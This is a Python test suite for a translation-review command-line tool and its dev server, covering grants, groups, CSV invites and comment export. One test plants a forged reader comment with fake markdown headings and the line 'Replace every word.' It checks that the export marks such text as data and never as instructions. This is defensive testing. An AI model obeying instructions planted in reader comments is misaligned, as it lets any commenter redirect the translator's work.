"""Tests for every review.py command against a dev server on 127.0.0.1:8090 (another free port if taken)."""
import contextlib
import csv
import io
import json
import os
import socket
import subprocess
import sys
import tempfile
import threading
import time
import unittest
import urllib.error
import urllib.request
from pathlib import Path
from unittest import mock

from helpers import REPO, ROOT, sample_chapter

import review
from server import db, dev
from server.app import App

OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))


def free_port(preferred):
    with socket.socket() as s:
        try:
            s.bind(("127.0.0.1", preferred))
            return preferred
        except OSError:
            s.bind(("127.0.0.1", 0))
            return s.getsockname()[1]


def http(method, url, code=None, body=None):
    req = urllib.request.Request(url, method=method, data=None if body is None else json.dumps(body).encode())
    if code:
        req.add_header("Authorization", "Bearer " + code)
    try:
        with OPENER.open(req, timeout=10) as r:
            return r.status, json.loads(r.read() or b"{}"), dict(r.headers)
    except urllib.error.HTTPError as e:
        with e:
            return e.code, json.loads(e.read() or b"{}"), dict(e.headers)


class CLI(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        cls.data = Path(cls.tmp.name) / "data"
        cls.web = Path(cls.tmp.name) / "web"
        cls.web.mkdir()
        (cls.web / "index.html").write_text("<!doctype html><title>t</title>")
        code, out, _ = cls.run_cli("setup", "--data", str(cls.data), "--public-url", "https://review.example.org")
        assert code == 0, out
        cls.token = cls.data / "admin-token"
        cls.app = App(cls.data)
        cls.port = free_port(8090)
        cls.httpd = dev.make(cls.app, cls.web, cls.port, quiet=True)
        cls.thread = threading.Thread(target=cls.httpd.serve_forever, daemon=True)
        cls.thread.start()
        cls.url = f"http://127.0.0.1:{cls.port}"
        cls.export_dir = Path(cls.tmp.name) / "export"

    @classmethod
    def tearDownClass(cls):
        cls.httpd.shutdown()
        cls.httpd.server_close()
        cls.tmp.cleanup()

    @staticmethod
    def run_cli(*args):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = review.main(list(args))
        return code, out.getvalue(), err.getvalue()

    def cli(self, *args, ok=True):
        code, out, err = self.run_cli("--server", self.url, "--token-file", str(self.token), *args)
        if ok:
            self.assertEqual(code, 0, err)
        return code, out, err

    def put_chapter(self, n):
        status, body, _ = http("PUT", f"{self.url}/api/admin/chapters/SC/SC{n:02d}", self.token.read_text().strip(),
                               sample_chapter(n))
        self.assertEqual(status, 200, body)

    def invite(self, name, *grant):
        _, out, _ = self.cli("invite", name, *[x for g in grant for x in ("--grant", g)])
        link = out.strip().splitlines()[-1]
        self.assertTrue(link.startswith("https://review.example.org/#k="), out)
        return link.split("#k=")[1]

    # ---------- setup, serve, backup ----------

    def test_setup_is_repeatable_and_rotates_on_request(self):
        before = self.token.read_text()
        code, out, _ = self.run_cli("setup", "--data", str(self.data))
        self.assertEqual(code, 0)
        self.assertIn("kept", out)
        self.assertEqual(self.token.read_text(), before)
        other = Path(self.tmp.name) / "other"
        self.run_cli("setup", "--data", str(other))
        first = (other / "admin-token").read_text()
        code, out, _ = self.run_cli("setup", "--data", str(other), "--new-token")
        self.assertIn(f"Admin token file: {other / 'admin-token'}", out)
        self.assertNotEqual((other / "admin-token").read_text(), first)
        self.assertEqual(oct(other.stat().st_mode & 0o777), "0o700")
        self.assertEqual(oct((other / "admin-token").stat().st_mode & 0o777), "0o600")
        self.assertEqual(json.loads((other / "config.json").read_text())["public_url"], "http://127.0.0.1:8087")

    def test_serve_needs_dev(self):
        code, _, err = self.run_cli("serve", "--data", str(self.data))
        self.assertEqual(code, 1)
        self.assertIn("--dev", err)

    def test_serve_dev_on_a_busy_port(self):
        code, _, err = self.run_cli("serve", "--dev", "--data", str(self.data), "--port", str(self.port))
        self.assertEqual(code, 1)
        self.assertIn(f"Port {self.port} is in use", err)
        self.assertNotIn("Traceback", err)

    def test_serve_dev_runs(self):
        port = free_port(8091)
        data = Path(self.tmp.name) / "serve-data"
        proc = subprocess.Popen([sys.executable, str(ROOT / "review.py"), "serve", "--dev", "--data", str(data),
                                 "--port", str(port)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        self.addCleanup(proc.stdout.close)
        self.addCleanup(proc.wait)
        self.addCleanup(proc.terminate)
        for _ in range(100):
            try:
                status, body, headers = http("GET", f"http://127.0.0.1:{port}/api/health")
                break
            except (urllib.error.URLError, ConnectionError):
                time.sleep(0.05)
        else:
            self.fail("the dev server did not start")
        self.assertEqual((status, body), (200, {"ok": True}))
        self.assertIn("Content-Security-Policy", headers)
        self.assertTrue((data / db.TOKEN_HASH).exists())

    def test_backup(self):
        code, out, _ = self.run_cli("backup", "--data", str(self.data), "--keep", "2")
        self.assertEqual(code, 0)
        path = Path(out.splitlines()[0].split(": ", 1)[1].strip())
        self.assertTrue(path.exists())
        self.assertEqual(path.parent, self.data / "backups")

    # ---------- chapters ----------

    @unittest.skipIf(REPO is None, "the translation repository is not found; set REVIEW_REPO")
    def test_publish_withdraw_and_chapters(self):
        _, out, err = self.cli("--repo", str(REPO), "publish", "SC", "01-08")
        lines = out.strip().splitlines()
        self.assertEqual(len(lines), 9)
        self.assertRegex(lines[0], r"^Reading main at [0-9a-f]{4,}, \d{4}-\d\d-\d\d, .+\.$")
        self.assertTrue(all(": published, " in l for l in lines[1:]), out)
        self.assertIn(f"Server: {self.url}", err)
        self.assertIn("SC03: published, 37 paragraphs", out)
        _, out, _ = self.cli("--repo", str(REPO), "publish", "SC", "03")
        self.assertIn("SC03: unchanged", out)
        _, out, _ = self.cli("withdraw", "SC", "03")
        self.assertIn("SC03: withdrawn", out)
        _, out, _ = self.cli("withdraw", "SC", "03")
        self.assertIn("SC03: already withdrawn", out)
        _, out, _ = self.cli("chapters")
        self.assertIn("SC03  withdrawn  37 paragraphs", out)
        self.assertIn("SC01  published  17 paragraphs", out)
        _, out, _ = self.cli("publish", "SC", "3", "--repo", str(REPO))
        self.assertIn("SC03: published again", out)
        code, out, err = self.cli("--repo", str(REPO), "publish", "SC", "02,99", ok=False)
        self.assertEqual(code, 1)
        self.assertIn("SC02: unchanged", out)
        self.assertIn("SC99: not found", err)
        self.assertIn("Not published: SC99.", err)
        code, _, err = self.cli("--repo", self.tmp.name, "publish", "SC", "01", ok=False)
        self.assertIn("is not a git repository", err)
        code, _, err = self.cli("publish", "XX", "01", ok=False)
        self.assertIn("Unknown book XX", err)
        with contextlib.redirect_stderr(io.StringIO()), self.assertRaises(SystemExit):
            review.main(["--server", self.url, "--token-file", str(self.token), "publish", "SC"])

    def test_withdraw_whole_book(self):
        _, out, _ = self.cli("withdraw", "QQ")
        self.assertIn("No chapter of QQ is published.", out)
        status, _, _ = http("PUT", f"{self.url}/api/admin/chapters/QQ/QQ01", self.token.read_text().strip(),
                            sample_chapter(1, book="QQ"))
        self.assertEqual(status, 200)
        _, out, _ = self.cli("withdraw", "QQ")
        self.assertIn("QQ01: withdrawn", out)
        _, out, _ = self.cli("chapters")
        self.assertIn("QQ01  withdrawn", out)

    # ---------- readers ----------

    def test_reader_commands(self):
        for n in (31, 32, 33):
            self.put_chapter(n)
        code = self.invite("Somchai Test", "SC31-32")
        status, me, _ = http("GET", f"{self.url}/api/me", code)
        self.assertEqual((status, [c["id"] for c in me["chapters"]]), (200, ["SC31", "SC32"]))
        self.assertFalse(me["english"])

        _, out, _ = self.cli("readers")
        self.assertIn("Somchai Test: active; own: SC31-32; English off; 0 comments; last active never", out)
        _, out, _ = self.cli("grant", "somchai test", "SC33")
        self.assertIn("own: SC31-33", out)
        _, out, _ = self.cli("ungrant", "Somchai Test", "SC31")
        self.assertIn("own: SC32-33", out)
        _, out, _ = self.cli("ungrant", "Somchai Test", "SC31")
        self.assertIn("did not hold SC31; nothing changed", out)
        _, out, _ = self.cli("grant", "Somchai Test", "SC")
        self.assertIn("own: SC;", out)
        _, out, _ = self.cli("grant", "Somchai Test", "SC32")
        self.assertIn("already reads SC32; nothing changed", out)
        # Closing one chapter of a whole-book grant takes one command, and the reader really loses it.
        _, out, _ = self.cli("ungrant", "Somchai Test", "SC32")
        self.assertNotIn("own: SC;", out)
        self.assertIn("SC31, SC33", out)
        self.assertIn("published later open to Somchai Test only after grant", out)
        self.assertEqual(http("GET", f"{self.url}/api/chapter/SC/SC32", code)[0], 404)
        self.assertEqual(http("GET", f"{self.url}/api/chapter/SC/SC33", code)[0], 200)
        _, out, _ = self.cli("ungrant", "Somchai Test", "SC")
        self.assertIn("own: nothing", out)
        self.cli("grant", "Somchai Test", "SC31-33")

        _, out, _ = self.cli("english", "Somchai Test", "on")
        self.assertIn("English on", out)
        self.assertTrue(http("GET", f"{self.url}/api/me", code)[1]["english"])
        self.cli("english", "Somchai Test", "off")

        _, out, _ = self.cli("revoke", "Somchai Test")
        self.assertIn("revoked", out)
        self.assertEqual(http("GET", f"{self.url}/api/me", code)[0], 401)
        _, out, _ = self.cli("restore", "Somchai Test")
        self.assertEqual(http("GET", f"{self.url}/api/me", code)[0], 200)

        _, out, _ = self.cli("relink", "Somchai Test")
        new = out.strip().splitlines()[-1].split("#k=")[1]
        self.assertEqual(http("GET", f"{self.url}/api/me", code)[0], 401)
        self.assertEqual(http("GET", f"{self.url}/api/me", new)[0], 200)

        code_, _, err = self.cli("invite", "Somchai Test", "--grant", "SC31", ok=False)
        self.assertIn("409", err)
        code_, _, err = self.cli("invite", "Nobody", "--grant", "ZZ01", ok=False)
        self.assertIn("Unknown book ZZ", err)
        code_, _, err = self.cli("grant", "No Such Person", "SC01", ok=False)
        self.assertIn("No reader named No Such Person", err)
        # Part of a name: the error suggests the readers whose names hold it.
        code_, _, err = self.cli("grant", "somchai", "SC01", ok=False)
        self.assertIn("No reader named somchai. Readers whose names hold it: Somchai Test.", err)

    def me(self, code):
        status, body, _ = http("GET", f"{self.url}/api/me", code)
        return status, [c["id"] for c in body.get("chapters", [])], body

    def test_group_commands(self):
        for n in (51, 52, 53, 54):
            self.put_chapter(n)
        _, out, _ = self.cli("group", "create", "Elders", "--grant", "SC51-52")
        self.assertIn("Elders: on; reads SC51-52; English off; 0 members", out)
        self.cli("invite", "Grace One", "--grant", "SC53")
        _, out, _ = self.cli("invite", "Grace Two", "--group", "elders")
        self.assertIn("Grace Two can read nothing of their own; groups Elders; English off.", out)
        two = out.strip().splitlines()[-1].split("#k=")[1]
        self.assertEqual(self.me(two)[1], ["SC51", "SC52"])
        _, out, _ = self.cli("group", "add", "Elders", "Grace One")
        self.assertIn("1 reader added to Elders. It has 2 members.", out)
        _, out, _ = self.cli("groups")
        self.assertIn("Elders: on; reads SC51-52; English off; 2 members\n    Grace One, Grace Two", out)
        _, out, _ = self.cli("group", "grant", "Elders", "SC54")
        self.assertIn("reads SC51-52, SC54", out)
        self.assertEqual(self.me(two)[1], ["SC51", "SC52", "SC54"])
        _, out, _ = self.cli("group", "ungrant", "Elders", "SC51")
        self.assertIn("reads SC52, SC54", out)
        _, out, _ = self.cli("group", "english", "Elders", "on")
        self.assertIn("English on", out)
        self.assertTrue(self.me(two)[2]["english"])
        _, out, _ = self.cli("readers", "--group", "Elders")
        self.assertIn("Grace Two: active; own: nothing; through Elders: SC52, SC54; groups Elders; "
                      "English on through a group;", out)
        self.assertIn("2 of ", out)
        _, out, _ = self.cli("group", "feature", "Elders", "english", "off")
        self.assertIn("Elders: english.on off.", out)
        _, out, _ = self.cli("group", "off", "Elders")
        self.assertIn("Elders: off;", out)
        self.assertEqual(self.me(two)[1], [])
        self.cli("group", "on", "Elders")
        _, out, _ = self.cli("group", "take-out", "Elders", "Grace Two")
        self.assertIn("1 reader taken out of Elders. It has 1 member.", out)
        self.assertEqual(self.me(two)[1], [])
        code, _, err = self.cli("group", "add", "Elders", "Nobody Here", ok=False)
        self.assertIn("No reader named Nobody Here; nothing changed.", err)
        code, _, err = self.cli("group", "grant", "Elders", ok=False)
        self.assertIn("Write: review.py group grant Elders SPEC", err)
        code, _, err = self.cli("group", "create", "Elders", ok=False)
        self.assertIn("409", err)
        code, _, err = self.cli("group", "on", "Nowhere", ok=False)
        self.assertIn("No group named Nowhere", err)
        _, out, _ = self.cli("group", "remove", "Elders")
        self.assertIn("Group Elders removed. Its 1 member keep their own grants.", out)
        self.assertEqual(self.me(self.invite("Grace Three", "SC53"))[1], ["SC53"])

    def test_commands_for_every_member_of_a_group(self):
        for n in (61, 62):
            self.put_chapter(n)
        self.cli("group", "create", "Choir", "--grant", "SC61")
        codes = [self.invite(f"Choir {i}", "SC62") for i in range(3)]
        self.cli("group", "add", "Choir", "Choir 0", "Choir 1")
        _, out, _ = self.cli("revoke", "--group", "Choir")
        self.assertIn("Choir: 2 readers revoked.", out)
        self.assertEqual([self.me(c)[0] for c in codes], [401, 401, 200])
        _, out, _ = self.cli("restore", "--group", "Choir")
        self.assertIn("Choir: 2 readers restored.", out)
        _, out, _ = self.cli("english", "--group", "Choir", "on")
        self.assertIn("English on for 2 members of Choir, as their own setting. The group's own setting is "
                      "changed with: review.py group english Choir on", out)
        self.assertEqual([self.me(c)[2]["english"] for c in codes], [True, True, False])
        _, out, _ = self.cli("feature", "Choir 2", "english", "on")
        self.assertIn("Choir 2: english.on on.", out)
        _, out, _ = self.cli("grant", "--group", "Choir", "SC61")
        self.assertIn("SC61 given to 2 members of Choir as their own grant; 0 already read it.", out)
        _, out, _ = self.cli("ungrant", "--group", "Choir", "SC61")
        self.assertIn("SC61 taken from the own grants of 2 members of Choir.", out)
        self.assertIn("A group still opens SC61 or part of it to: Choir 0, Choir 1.", out)
        _, out, err = self.cli("relink", "--group", "Choir", "--yes")
        self.assertNotIn("#k=", out + err)
        path = Path(out.split("The links are in ")[1].split(" (mode 600)")[0])
        self.assertEqual(path.parent, self.token.parent)
        self.assertEqual(oct(path.stat().st_mode & 0o777), "0o600")
        rows = path.read_text().splitlines()
        self.assertEqual(rows[0], "name,link")
        self.assertEqual(len(rows), 3)
        self.assertEqual([self.me(c)[0] for c in codes], [401, 401, 200])
        self.assertEqual(self.me(rows[1].split("#k=")[1])[0], 200)
        code, _, err = self.cli("revoke", "Choir 2", "--group", "Choir", ok=False)
        self.assertIn("Name one reader, or give --group G", err)
        code, _, err = self.cli("revoke", ok=False)
        self.assertIn("Name one reader, or give --group G", err)
        _, out, _ = self.cli("features")
        self.assertIn("english.on: bool, default off; show the English source beside the translation", out)

    def test_invite_from_a_file(self):
        self.put_chapter(71)
        self.cli("group", "create", "Batch", "--grant", "SC71")
        folder = Path(self.tmp.name) / "csv"
        folder.mkdir(exist_ok=True)
        good = folder / "good.csv"
        good.write_text("\ufeffname,groups,grants,english\n"
                        "Batch Reader 1,Batch,,yes\n"
                        "\"Batch, Reader 2\",,SC71 SC72,no\n"
                        "Batch Reader 3,Batch,SC72,\n", encoding="utf-8")
        _, out, err = self.cli("invite", "--from", str(good))
        self.assertNotIn("#k=", out + err)
        self.assertIn("3 readers invited. Their links are in ", out)
        path = Path(out.split("Their links are in ")[1].split(" (mode 600)")[0])
        self.assertEqual((path.parent, oct(path.stat().st_mode & 0o777)), (self.token.parent, "0o600"))
        links = dict(row.rsplit(",", 1) for row in path.read_text().splitlines()[1:])
        self.assertEqual(len(links), 3)
        status, chapters, me = self.me(links["Batch Reader 1"].split("#k=")[1])
        self.assertEqual((status, chapters, me["english"]), (200, ["SC71"], True))
        _, out, _ = self.cli("readers", "--group", "Batch")
        self.assertIn("2 of ", out)
        # One bad line stops the whole file: nothing is created and no links file is left.
        before = sorted(self.token.parent.glob("links-*"))
        bad = folder / "bad.csv"
        bad.write_text("name,grants,english,groups\nBatch Reader 4,SC71,maybe,\nBatch Reader 5,,,\n"
                       "Batch Reader 6,ZZ01,,\nBatch Reader 6,SC71,,\n")
        code, _, err = self.cli("invite", "--from", str(bad), ok=False)
        self.assertEqual(code, 1)
        for line in ("Line 2: Batch Reader 4: english must be yes or no, not 'maybe'.",
                     "Line 3: Batch Reader 5 has no group and no grant, so the link would open nothing.",
                     "Line 4: Batch Reader 6: Unknown book ZZ.", "Line 5: Batch Reader 6 is already on line 4.",
                     "Nothing was changed."):
            self.assertIn(line, err)
        # A name the server already holds and an unknown group are refused by the server, all or nothing.
        clash = folder / "clash.csv"
        clash.write_text("name,groups\nBatch Reader 7,Batch\nBatch Reader 1,Batch\nBatch Reader 8,Nope\n")
        code, _, err = self.cli("invite", "--from", str(clash), ok=False)
        self.assertIn("Row 2: A reader named Batch Reader 1 already exists.", err)
        self.assertIn("Row 3: No group named Nope.", err)
        self.assertEqual(sorted(self.token.parent.glob("links-*")), before)
        _, out, _ = self.cli("readers", "--group", "Batch")
        self.assertNotIn("Batch Reader 7", out)
        for bad_head in ("nom,grants\nX,SC71\n", "name,group\nX,Batch\n"):
            (folder / "head.csv").write_text(bad_head)
            code, _, err = self.cli("invite", "--from", str(folder / "head.csv"), ok=False)
            self.assertIn("must start with the line: name,groups,grants,english", err)
        code, _, err = self.cli("invite", "Someone", "--from", str(good), ok=False)
        self.assertIn("takes everything from the file", err)
        code, _, err = self.cli("invite", "Someone", ok=False)
        self.assertIn("at least one --grant or --group", err)

    def test_readers_filters(self):
        self.put_chapter(81)
        status, _, _ = http("PUT", f"{self.url}/api/admin/chapters/QB/QB01", self.token.read_text().strip(),
                            sample_chapter(1, book="QB"))
        self.assertEqual(status, 200)
        quiet = self.invite("Filter Quiet", "SC81")
        busy = self.invite("Filter Busy", "SC81")
        http("PUT", f"{self.url}/api/place", busy, {"book": "SC", "ch": "SC81", "a": "SC 181.1"})
        self.cli("revoke", "Filter Quiet")
        _, out, _ = self.cli("readers", "--inactive")
        self.assertIn("Filter Quiet:", out)
        self.assertNotIn("Filter Busy:", out)
        _, out, _ = self.cli("readers", "--inactive", "30")
        self.assertNotIn("Filter Busy:", out)
        _, out, _ = self.cli("readers", "--revoked")
        self.assertIn("Filter Quiet: revoked;", out)
        self.assertNotIn("Filter Busy", out)
        self.assertRegex(out, r"\n\d+ of \d+ readers\.\n$")
        _, out, _ = self.cli("readers", "--book", "qb")
        self.assertRegex(out, r"^0 of \d+ readers\.\n$")
        _, out, _ = self.cli("readers")
        self.assertRegex(out, r"\n\d+ readers\.\n$")
        self.assertTrue(quiet)

    # ---------- comments ----------

    def test_export_and_processed(self):
        self.put_chapter(41)
        code = self.invite("Export Reader", "SC41")
        for i, (a, kind, quote) in enumerate([("SC 141.2", "wording", "Paragraph 2"), ("SC 141.1", "flag", "")]):
            status, body, _ = http("POST", f"{self.url}/api/comments", code, {
                "client_id": f"exp-{i}", "book": "SC", "ch": "SC41", "a": a, "kind": kind, "quote": quote,
                "text": f"Comment {i}"})
            self.assertEqual(status, 201, body)
        out_file = self.export_dir / "one.json"
        _, out, _ = self.cli("export", "--ch", "sc41", "--out", str(out_file))
        self.assertIn("2 comments, 2 not yet processed.", out)
        res = json.loads(out_file.read_text())
        cs = res["comments"]
        self.assertEqual([c["anchor"] for c in cs], ["SC 141.1", "SC 141.2"])
        self.assertEqual(cs[1]["reader"], "Export Reader")
        self.assertTrue(cs[1]["quote_found"])
        for key in ("id", "reader", "book", "ch", "anchor", "kind", "quote", "text", "created", "updated", "processed",
                    "th", "anchor_missing"):
            self.assertIn(key, cs[0])
        self.assertEqual(res["server"], self.url)
        md = out_file.with_suffix(".md").read_text()
        self.assertIn(f"# Reader comments\n\nServer {self.url}, exported ", md)
        self.assertIn("## SC41 Title 41 (English title 41)", md)
        self.assertIn("### {SC 141.2}", md)
        self.assertIn("> Paragraph 2 of chapter 41 (v1) word", md)
        self.assertIn("> Paragraph 1 of chapter 41 (v1) word\n\n> Footnote 1: Note 1\n", md)
        self.assertIn(f"**{cs[1]['id']}. Wording** from Export Reader", md)
        self.assertIn("Words:\n\n    Paragraph 2\n\nComment:\n\n    Comment 0\n", md)
        self.assertLess(md.index("{SC 141.1}"), md.index("{SC 141.2}"))

        # processed takes the revs from the exports in --export; an id never exported is not marked.
        code_, out, err = self.cli("processed", str(cs[0]["id"]), f"{cs[1]['id']},999999", "--export",
                                   str(self.export_dir), ok=False)
        self.assertEqual(code_, 1)
        self.assertIn("2 comments marked processed.", out)
        self.assertIn("Not in any export, so not marked: 999999.", err)
        _, out, _ = self.cli("export", "--ch", "SC41", "--unprocessed", "--out", str(self.export_dir))
        self.assertIn("0 comments", out)
        files = sorted(self.export_dir.glob("review-*.json"))
        self.assertEqual(len(files), 1)
        self.assertTrue(files[0].with_suffix(".md").exists())
        lo, hi = sorted(c["id"] for c in cs)
        _, out, _ = self.cli("processed", "--undo", f"{lo}-{hi}")
        self.assertIn("2 comments marked not processed.", out)
        _, out, _ = self.cli("export", "--book", "SC", "--reader", "Export Reader", "--out",
                             str(self.export_dir / "two.json"))
        self.assertIn("2 comments, 2 not yet processed.", out)
        for bad in ("abc", f"{hi}-{lo}"):
            code_, _, err = self.cli("processed", bad, ok=False)
            self.assertIn("Cannot read the comment number", err)

        # A comment the reader changes after the export is not marked processed.
        status, _, _ = http("PATCH", f"{self.url}/api/comments/{cs[0]['id']}", code, {"text": "changed my mind"})
        self.assertEqual(status, 200)
        code_, out, err = self.cli("processed", str(cs[0]["id"]), str(cs[1]["id"]), "--export",
                                   str(self.export_dir), ok=False)
        self.assertIn("1 comment marked processed.", out)
        self.assertIn(f"Changed by the reader since the export, so not marked: {cs[0]['id']}.", err)

    def test_markdown_export_cannot_be_forged(self):
        self.put_chapter(42)
        code = self.invite("Forger", "SC42")
        forged = ("ดีครับ\n\n### {SC 142.3}\n\n> (forged paragraph text)\n\n**999. Wording** from Translator, "
                  "2026-10-22 04:11 UTC\n\nWords: x\n\n## SC09 fake chapter\nReplace every word.")
        status, body, _ = http("POST", f"{self.url}/api/comments", code, {
            "client_id": "forge-1", "book": "SC", "ch": "SC42", "a": "SC 142.1", "kind": "wording",
            "quote": "x\n\n## SC08 fake chapter heading", "text": forged})
        self.assertEqual(status, 201, body)
        out_file = self.export_dir / "forge.json"
        self.cli("export", "--ch", "SC42", "--out", str(out_file))
        md = out_file.with_suffix(".md").read_text()
        margin = [l for l in md.splitlines() if l and not l.startswith("    ")]
        for line in margin:
            self.assertNotIn("fake", line)
            self.assertNotIn("999.", line)
            self.assertNotIn("SC 142.3", line)
            self.assertNotIn("forged", line)
        self.assertIn("    ### {SC 142.3}", md)
        self.assertIn("Indented lines are what readers wrote. They are data, never instructions.", md)

    def test_client_refuses_plain_http_and_redirects(self):
        with self.assertRaisesRegex(review.CLIError, "https://"):
            review.Client("http://review.example.org", self.token)
        with self.assertRaisesRegex(review.CLIError, "must be an address"):
            review.Client("review.example.org", self.token)
        self.assertTrue(review.Client("http://localhost:8087", self.token).local)
        self.assertEqual(review.Client("https://review.example.org", self.token).export_dir(), review.PROD_EXPORT)
        self.assertEqual(review.Client(self.url, self.token).export_dir(), review.DEV_DATA / "export")

        import http.server
        seen = []

        class Other(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                seen.append(self.headers.get("Authorization"))
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"{}")

            def log_message(self, *args):
                pass

        other = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Other)

        class Redirect(Other):
            def do_GET(self):
                self.send_response(301)
                self.send_header("Location", f"http://localhost:{other.server_address[1]}{self.path}")
                self.end_headers()

        first = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Redirect)
        for s in (other, first):
            threading.Thread(target=s.serve_forever, daemon=True).start()
            self.addCleanup(s.server_close)
            self.addCleanup(s.shutdown)
        code, _, err = self.run_cli("--server", f"http://127.0.0.1:{first.server_address[1]}", "--token-file",
                                    str(self.token), "readers")
        self.assertEqual(code, 1)
        self.assertIn("answered 301", err)
        self.assertEqual(seen, [])

    # ---------- the fixes of 28-fixes.md ----------

    def test_backups_are_never_written_over_and_go_by_age(self):
        data = Path(self.tmp.name) / "backup-data"
        db.setup(data)
        out = data / "backups"
        out.mkdir()
        for name in ("review-2020-01-01.sqlite3", "review-2020-01-02-030000.sqlite3", "notes.txt"):
            (out / name).write_text("old")
        first, second = db.backup(data, keep=2), db.backup(data, keep=2)
        self.assertNotEqual(first, second)
        self.assertRegex(first.name, r"^review-\d{4}-\d\d-\d\d-\d{6}(-\d+)?\.sqlite3$")
        self.assertEqual(sorted(p.name for p in out.iterdir()), sorted([first.name, second.name, "notes.txt"]))
        # The newest copies always stay, however old they are.
        (out / "review-2020-01-01.sqlite3").write_text("old")
        db.backup(data, keep=14)
        self.assertTrue((out / "review-2020-01-01.sqlite3").exists())

    def test_the_server_file_ties_the_token_to_its_server(self):
        folder = Path(self.tmp.name) / "prod-config"
        folder.mkdir()
        token = folder / "admin-token"
        token.write_text(self.token.read_text())
        (folder / "server").write_text(self.url + "/\n")
        code, out, err = self.run_cli("--token-file", str(token), "chapters")
        self.assertEqual(code, 0, err)
        self.assertIn(f"Server: {self.url}", err)
        other = f"http://127.0.0.1:{free_port(8098)}"
        code, _, err = self.run_cli("--server", other, "--token-file", str(token), "chapters")
        self.assertEqual(code, 1)
        self.assertIn(f"belongs to {self.url}/", err)
        with mock.patch.dict(os.environ, {"REVIEW_SERVER": other}):
            code, _, err = self.run_cli("--token-file", str(token), "chapters")
        self.assertEqual(code, 1)
        self.assertIn("Leave out --server and REVIEW_SERVER", err)

    def test_answers_compressed_with_gzip_are_unpacked(self):
        import gzip
        import http.server
        seen = []

        class Packed(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                seen.append(self.headers.get("Accept-Encoding"))
                body = gzip.compress(json.dumps({"chapters": [], "word": "ก"}).encode())
                self.send_response(200 if self.path == "/ok" else 400)
                self.send_header("Content-Encoding", "gzip")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *args):
                pass

        server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Packed)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)
        client = review.Client(f"http://127.0.0.1:{server.server_address[1]}", self.token)
        self.assertEqual(client.call("GET", "/ok"), {"chapters": [], "word": "ก"})
        with self.assertRaisesRegex(review.CLIError, "answered 400"):
            client.call("GET", "/bad")
        self.assertEqual(seen, ["gzip", "gzip"])

    def test_ungrant_names_the_group_that_still_opens_the_chapter(self):
        self.put_chapter(95)
        self.cli("group", "create", "Youth95", "--grant", "SC95")
        self.cli("invite", "Anan Ninety", "--group", "Youth95")
        _, out, _ = self.cli("ungrant", "Anan Ninety", "SC95")
        self.assertIn("Anan Ninety holds SC95 only through the group Youth95; nothing changed. To close it for the "
                      "whole group: review.py group ungrant Youth95 SC95", out)
        _, out, _ = self.cli("ungrant", "--group", "Youth95", "SC95")
        self.assertIn("No member of Youth95 holds SC95 as their own grant; nothing changed.", out)
        self.assertIn("The group Youth95 itself opens SC95.", out)

    def test_a_split_whole_book_grant_keeps_withdrawn_chapters(self):
        for n in (91, 92, 93):
            self.put_chapter(n)
        self.cli("withdraw", "SC", "92")
        code = self.invite("Dara Ninety", "SC")
        _, out, _ = self.cli("ungrant", "Dara Ninety", "SC93")
        self.assertIn("SC91-92", out)
        self.assertNotIn("SC93", self.me(code)[1])
        self.put_chapter(92)                       # published again
        self.assertIn("SC92", self.me(code)[1])

    def test_invite_into_a_group_that_is_off_says_so(self):
        self.put_chapter(97)
        self.cli("group", "create", "Off97", "--grant", "SC97")
        self.cli("group", "off", "Off97")
        _, out, _ = self.cli("invite", "Chai Ninety", "--group", "Off97")
        self.assertIn("The group Off97 is off, so it opens nothing to its members until: review.py group on Off97", out)
        f = Path(self.tmp.name) / "off97.csv"
        f.write_text("name,groups\nChai Ninety Two,Off97\n")
        _, out, _ = self.cli("invite", "--from", str(f))
        self.assertIn("review.py group on Off97", out)

    def test_closing_a_group_names_members_who_still_open_its_chapters(self):
        self.put_chapter(94)
        self.cli("group", "create", "Close94", "--grant", "SC94")
        self.cli("group", "create", "Other94", "--grant", "SC94")
        self.cli("invite", "Own Grant94", "--grant", "SC94", "--group", "Close94")
        self.cli("invite", "Only Group94", "--group", "Close94")
        self.cli("invite", "Two Groups94", "--group", "Close94", "--group", "Other94")
        _, out, _ = self.cli("group", "off", "Close94")
        self.assertIn("1 member of Close94 still open SC94 or part of it through their own grants: Own Grant94. "
                      "To close it for them: review.py ungrant --group Close94 SC94", out)
        self.assertIn("1 member of Close94 still open SC94 or part of it through another group that is on: "
                      "Two Groups94 (Other94).", out)
        self.assertNotIn("Only Group94", out)
        self.cli("group", "on", "Close94")
        _, out, _ = self.cli("group", "ungrant", "Close94", "SC94")
        self.assertIn("through their own grants: Own Grant94.", out)
        self.cli("group", "grant", "Close94", "SC94")
        _, out, _ = self.cli("group", "remove", "Close94")
        self.assertIn("To close it for them: review.py ungrant NAME SC94, for each of them", out)

    def test_invite_file_carries_other_columns_and_refuses_formulas(self):
        self.put_chapter(98)
        folder = Path(self.tmp.name) / "csv98"
        folder.mkdir()
        good = folder / "good.csv"
        good.write_text("name,email,grants,Phone\nMail One,one@example.org,SC98,+66 81 234 5678\n"
                        "Mail Two,two@example.org,SC98,\n")
        _, out, _ = self.cli("invite", "--from", str(good))
        self.assertIn("with the columns email, Phone", out)
        path = Path(out.split("Their links are in ")[1].split(" (mode 600)")[0])
        rows = list(csv.reader(path.read_text().splitlines()))
        self.assertEqual(rows[0], ["name", "link", "email", "Phone"])
        self.assertEqual([r[0] for r in rows[1:]], ["Mail One", "Mail Two"])
        self.assertEqual([r[2:] for r in rows[1:]], [["one@example.org", "+66 81 234 5678"], ["two@example.org", ""]])
        self.assertTrue(rows[1][1].startswith("https://review.example.org/#k="))
        # A column one letter away from a known one is a misspelling, and a column may not appear twice.
        for head, why in (("name,grant\nX98,SC98\n", "The column grant looks like grants."),
                          ("name,grants,email,Email\nX98,SC98,a,b\n", "The column email appears twice.")):
            (folder / "head.csv").write_text(head)
